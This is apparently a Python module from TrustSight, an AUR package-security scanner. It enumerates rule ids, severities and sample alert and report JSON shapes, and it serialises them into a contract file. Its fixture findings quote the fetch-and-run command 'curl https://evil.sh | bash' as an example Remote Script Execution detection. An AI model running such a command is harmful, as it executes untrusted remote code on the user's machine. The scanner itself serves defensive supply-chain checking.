"""The cross-surface contract: the ids and JSON shapes consumers depend on.

The AUR watcher, the measurement harness and the notifications feed each
consume a different projection of TrustSight - the ntfy alert document, the
report body, the rule taxonomy - and none of them can see the others.  A field
renamed here, or a rule id added there, breaks a consumer silently: the feed
parses a key that no longer exists, the harness raises ``UnknownVerdictError``
at run time, the catalog renders an id it cannot explain.

This module is the one place those projections are enumerated, and
:func:`contract` serialises them to ``contract/contract.json`` so a consumer
can test against a real core output without importing core:

    python -m trustsight.contract --emit     # write contract/contract.json
    python -m trustsight.contract --check    # exit 1 when the file is stale

``tests/test_contract_artifact.py`` asserts the committed file regenerates
byte-for-byte, the same gate the fixture builders use.
"""

from __future__ import annotations

import argparse
import json
import sys
import tomllib
from pathlib import Path

__all__ = [
    "ARTIFACT_PATH",
    "contract",
    "coverage_gaps",
    "main",
    "pseudo_rule_ids",
    "rule_ids",
    "sample_alert_payload",
    "sample_ingest",
    "sample_report_body",
    "severities",
]

#: The committed artifact, at the repository root so a sibling checkout reads
#: ``../trustsight/contract/contract.json`` without knowing core's layout.
ARTIFACT_PATH = Path(__file__).resolve().parents[2] / "contract" / "contract.json"


def rule_ids() -> list[str]:
    """Every published rule id, from the taxonomy the docs are built from."""
    from .categories import RULE_CATEGORIES

    return sorted(RULE_CATEGORIES)


def pseudo_rule_ids() -> list[str]:
    """Rule ids the tool emits that are not published rules with a docs page.

    The weighted novelty signal, the source-provenance bucket, the coverage
    gap, and the P-series declared practices (P004 is skipped).  These carry
    no ``### P0NN:`` heading, so a catalog built only from the docs cannot
    explain them - the feed keeps presentation text for each, and this list is
    the id set that text must cover.
    """
    from . import scoring

    return sorted({
        "NOVELTY",
        "SOURCE_BUCKET",
        "COVERAGE",
        scoring.P_CHECKSUMS,
        scoring.P_VALIDPGPKEYS,
        scoring.P_SIGNATURE_SOURCE,
        scoring.P_COMMIT_PINNED,
        scoring.P_TAG_PINNED,
        scoring.P_TRUSTED_FORGE,
        scoring.P_NO_COMMIT_PIN,
    })


def severities() -> list[str]:
    """The severity vocabulary a finding may carry, from the shipped weights.

    Read from ``DEFAULT_CONFIG`` and not the machine's ``config.toml``: a
    developer override must not redefine the vocabulary a consumer was written
    against.
    """
    from .config import DEFAULT_CONFIG

    weights = tomllib.loads(DEFAULT_CONFIG).get("severity_weights", {})
    return sorted(weights)


def coverage_gaps() -> list[str]:
    """Every coverage-gap type the analysis can record."""
    from .coverage import GAP_REASONS

    return sorted(GAP_REASONS)


def sample_alert_payload() -> dict:
    """A representative ntfy alert document, exercised through every branch.

    One cycle carrying new alerts, an over-threshold package with located
    findings, an IOC match, a campaign cluster and an impersonation campaign,
    so the feed's parser sees each field it reads.  Built from the same
    ``notify.alert_payload`` the watcher POSTs - never a hand-written copy.
    """
    from .full_aur.pipeline import CycleResult
    from .notify import alert_payload

    cycle = CycleResult(
        added=3,
        changed=41,
        removed=2,
        processed=44,
        new_alerts=[("some-pkg", "H088")],
        over_threshold=[("hot-pkg", 45)],
        ioc_hits=[("bad-pkg", "hash:deadbeef")],
        refusals=["unread-pkg"],
        detail={
            "hot-pkg": {
                "score": 45,
                "old_version": "1.0",
                "new_version": "1.1",
                "last_modified": 1777593600,
                "rules": ["R001", "P001"],
                "findings": [
                    {"rule_id": "R001", "severity": "CRITICAL", "weight": 30,
                     "file": "PKGBUILD", "line": 12,
                     "reason": "Remote Script Execution: curl https://evil.sh | bash"},
                    {"rule_id": "P001", "severity": "INFO", "weight": 0,
                     "file": "", "line": None,
                     "reason": "checksums declared for all non-VCS sources"},
                ],
            }
        },
        cluster_findings=[
            {"rule_id": "G001", "severity": "HIGH",
             "params": {"members": ["a", "b", "c"]}},
            {"rule_id": "G005", "severity": "HIGH",
             "params": {"members": ["yyay", "parru"], "maintainer": "marchos1as",
                        "targets": ["yay", "paru"], "count": 2}},
        ],
    )
    return alert_payload(cycle)


def sample_report_body() -> dict:
    """The report body ``review --json`` and the harness both read.

    Constructed directly rather than analysed, so it is deterministic and needs
    no tokenizer.  The key set is the contract; the values are illustrative.
    """
    from .api._models import Finding, Report

    report = Report(
        package="demo",
        old_version="1.0",
        new_version="1.1",
        score=45,
        risk="Medium",
        risk_label="Medium",
        verdict="Version bump. modified PKGBUILD. Review the diff before building.",
        findings=(
            Finding(rule_id="R001", severity="CRITICAL", weight=30,
                    description="curl https://evil.sh | bash",
                    file="PKGBUILD", line=12),
            Finding(rule_id="H001", severity="HIGH", weight=25,
                    description="checksum set to SKIP"),
        ),
    )
    return report.to_dict(include_score=True, verbose=True)


def sample_ingest() -> dict:
    """The signed direct-ingest request the feed accepts.

    The body is the alert payload, unchanged; the request carries four headers
    and an Ed25519 signature over ``webhook-id.webhook-timestamp.raw_body``.
    The feed holds only the public half of the key.
    """
    return {
        "method": "POST",
        "headers": ["webhook-id", "webhook-timestamp", "webhook-key-id",
                    "webhook-signature"],
        "signature_algorithm": "ed25519",
        "signed_material": "webhook-id.webhook-timestamp.raw_body",
        "signature_format": "v1=<base64>",
        "body": sample_alert_payload(),
    }


def contract() -> dict:
    """The whole contract document."""
    return {
        "version": 1,
        "rule_ids": rule_ids(),
        "pseudo_rule_ids": pseudo_rule_ids(),
        "severities": severities(),
        "coverage_gaps": coverage_gaps(),
        "alert_payload": sample_alert_payload(),
        "ingest": sample_ingest(),
        "report_body": sample_report_body(),
    }


def render() -> str:
    """The artifact bytes: stable key order, two-space indent, trailing newline."""
    return json.dumps(contract(), indent=2, sort_keys=True) + "\n"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n", 1)[0])
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--emit", action="store_true",
                       help="write contract/contract.json if it changed")
    group.add_argument("--check", action="store_true",
                       help="exit 1 when contract/contract.json is stale")
    parser.add_argument("--out", default=str(ARTIFACT_PATH),
                        help="artifact path (default: contract/contract.json)")
    args = parser.parse_args(argv)

    out = Path(args.out)
    current = out.read_text() if out.exists() else ""
    generated = render()

    if args.check:
        if current != generated:
            print(f"{out} is out of date. Run: python -m trustsight.contract --emit",
                  file=sys.stderr)
            return 1
        print(f"contract is current ({len(rule_ids())} rules)")
        return 0

    if current == generated:
        print("contract already current")
        return 0
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(generated)
    print(f"wrote {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
